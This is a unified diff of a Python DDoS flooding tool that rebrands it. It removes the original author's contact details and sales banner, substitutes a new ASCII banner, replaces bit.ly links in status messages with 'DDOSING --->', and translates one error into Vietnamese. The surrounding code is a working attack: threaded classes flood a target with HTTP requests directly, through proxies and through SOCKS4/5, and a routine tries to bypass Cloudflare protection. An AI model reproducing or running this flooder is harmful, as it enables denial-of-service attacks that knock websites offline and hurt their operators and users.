@@ -1,12 +1,4 @@
 
-#[+]==============[ Contact ]===========[+]#
-# # Discord: PassDDoS#6595               # #
-# # ICQ    : @passddos                   # #
-# # Tele   : https://t.me/PassDDoS       # #
-# # Email  : passddos@gmail.com          # #
-# # Github : https://github.com/PassDDoS # #
-#[+]====================================[+]#
-
 import os, sys
 
 try:
@@ -184,17 +176,16 @@ def logo():
     elif sys.platform.startswith("freebsd"):
         os.system('clear')
     else:
-        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Download: bit.ly/AnonyV28 ~ Anonymous DDoSer v2.8")
+        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Tool DDoSer")
     print('''
-             - PassDDoS#6595 Selling Bypass JS/UAM/Captcha/etc -
-
-    /\_____/\     88""Yb    db    .dP"Y8 .dP"Y8 8888b.  8888b.   dP"Yb  .dP"Y8
-   /  o   o  \    88__dP   dPYb   `Ybo." `Ybo."  8I  Yb  8I  Yb dP   Yb `Ybo."
-  ( ==  ^  == )   88"""   dP__Yb  o.`Y8b o.`Y8b  8I  dY  8I  dY Yb   dP o.`Y8b
-   )         (    88     dP""""Yb 8bodP' 8bodP' 8888Y"  8888Y"   YbodP  8bodP'
-  (           )   ========================================================
- ( (  )   (  ) )     Anonymous DDoSer v2.8 - Best HTTP Flooder For FREE
-(__(__)___(__)__) ===== Version: [ Private ]''')
+             
+888888ba  888888ba   .88888.  .d88888b           .d88888b  dP     dP dP  888888ba  
+88    `8b 88    `8b d8'   `8b 88.    "'          88.    "' 88     88 88  88    `8b 
+88     88 88     88 88     88 `Y88888b.          `Y88888b. 88    .8P 88 a88aaaa8P' 
+88     88 88     88 88     88       `8b 88888888       `8b 88    d8' 88  88        
+88    .8P 88    .8P Y8.   .8P d8'   .8P          d8'   .8P 88  .d8P  88  88        
+8888888P  8888888P   `8888P'   Y88888P            Y88888P  888888'   dP  dP        
+ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -386,7 +377,7 @@ def pass_cf():
         print("[!] Bypassing Again... [" +str(error_cf)+ "]")
         if error_cf>5:
             os.system("cls")
-            print("[!] ERROR BYPASS\n[!] Please Select Another Attack Or Ignore Method[!]")
+            print("[!] ERROR BYPASS\n[!] Vui lòng chọn hình thức khác [!]")
             start_mode()
         else:
             pass_cf()
@@ -515,7 +506,7 @@ class raw_dos(threading.Thread):
                     requests.get(url, headers=headersx)
                 else:
                     requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] DDOSING ---> | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 while True:
                     try:
                         for _ in range(100):
@@ -575,9 +566,9 @@ class Proxy(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] DDOSING ---> | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
-                print("[!] bit.ly/AnonyV28 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] DDOSING ---> | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -647,7 +638,7 @@ class Socks(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[!] bit.ly/AnonyV28 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                print("[!] DDOSING ---> | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
@@ -677,7 +668,7 @@ class Socks(threading.Thread):
                     if str(port) == '443':
                         s = ssl.wrap_socket(s)
                     s.send(str.encode(request))
-                    print("[!] bit.ly/AnonyV28 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
+                    print("[!] DDOSING ---> | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                     try:
                         for y in range(multiple):
                             s.send(str.encode(request))
@@ -725,9 +716,9 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[+] bit.ly/AnonyV28 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] DDOSING ---> | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] DDOSING ---> | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
                 try:
                     for y in range(multiple):
@@ -779,7 +770,7 @@ class JSv1(threading.Thread):
                     http.request("GET", url, headers=headersx)
                 else:
                     http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] DDOSING ---> | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 try:
                     for y in range(multiple):
                         http.request("GET", url,headers=headersx)
@@ -811,7 +802,7 @@ class JSv2(threading.Thread):
                     soso = scraper.get(url, timeout=15)
                 else:
                     soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
-                print("[+] bit.ly/AnonyV28 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
+                print("[+] DDOSING ---> | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                 #req_code += 1
                 try:
                     for y in range(multiple):
